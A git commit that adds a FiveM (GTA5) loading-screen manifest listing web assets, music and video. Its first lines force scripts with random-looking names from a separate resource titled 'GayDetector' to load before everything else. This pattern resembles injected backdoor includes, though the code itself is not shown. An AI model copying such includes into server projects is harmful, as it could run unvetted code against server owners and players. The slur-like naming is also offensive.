94af9eaf164dfca502a3e98a286fa0703da0c646
vashaka1 <118055261+vashaka1@users.noreply.github.com>
2022-12-20 20:26:01 +0400

    Add files via upload

---
+++ qb-loadingscreen/fxmanifest.lua
@@ -0,0 +1,24 @@
+-- THIS MUST BE ABOVE ALL OTHER SCRIPTS
+client_script "@GayDetector/SQxtXXJEoS-y9q9y5f2top5k1nzeki87m.lua"
+server_script "@GayDetector/dtLHXiFVuK-udh4yuhrka09zlsfriodip.lua"
+------------------------------------------
+
+fx_version 'cerulean'
+games { 'gta5' }
+
+author 'Redven Biker (XLife.fr)'
+description 'Discord : https://discord.gg/C3aN2bBVbB'
+version '1.0.0'
+
+loadscreen 'index.html'
+loadscreen_manual_shutdown 'yes'
+client_script 'client.lua'
+
+files {
+    'index.html',
+    'css/style.css',
+    'js/script.js',
+    'img/logo.png',
+    'music/music.mp3',
+    'video/video.mp4'
+}
